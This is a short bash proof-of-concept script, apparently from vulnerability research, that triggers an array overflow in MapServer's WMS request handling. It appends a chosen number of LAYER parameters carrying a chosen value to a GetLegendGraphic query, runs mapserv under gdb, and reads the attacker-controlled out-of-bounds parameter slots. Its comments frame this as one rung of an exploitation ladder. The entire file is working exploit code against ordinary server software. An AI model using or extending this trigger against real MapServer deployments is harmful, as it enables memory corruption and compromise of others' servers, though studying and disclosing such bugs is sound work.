#!/bin/bash
# Live-process chosen-value readback on a plain (non-ASan) stock mapserv.
# The overflow completes; gdb stops at the msWMSLoadGetMapParams call and reads
# the out-of-bounds parameter slots. Debugger observation is rung-4 mechanics,
# not execution or rung 5.
set -u
cd "$(dirname "$0")" || exit 2
K=${1:-95}
VAL=${2:-DEADBEEFCAFEBABE}
MAP=$(realpath legend.map)
QS="map=${MAP}&SERVICE=WMS&VERSION=1.3.0&REQUEST=GetLegendGraphic&BBOX=0,0,1,1"
SRC=mapwms.cpp
for ((i=0; i<K; i++)); do QS+="&LAYER=${VAL}"; done
export REQUEST_METHOD=GET QUERY_STRING="$QS" SCRIPT_NAME=/mapserv
export MAPSERVER_CONFIG_FILE="$PWD/mapserver.conf"
export MS_MAP_PATTERN='^/'
export SERVER_NAME=127.0.0.1 SERVER_PORT=80 SERVER_PROTOCOL=HTTP/1.1 GATEWAY_INTERFACE=CGI/1.1
gdb -q --batch \
  -ex 'set pagination off' \
  -ex 'set breakpoint pending on' \
  -ex "break ${SRC}:6017" \
  -ex 'run' \
  -ex 'printf "NumParams=%d\n", req->NumParams' \
  -ex 'x/s req->ParamNames[100]' \
  -ex 'x/s req->ParamValues[100]' \
  -ex 'x/s req->ParamValues[150]' \
  -ex 'x/s req->ParamValues[190]' \
  -ex 'bt 4' \
  ./build-plain/mapserv
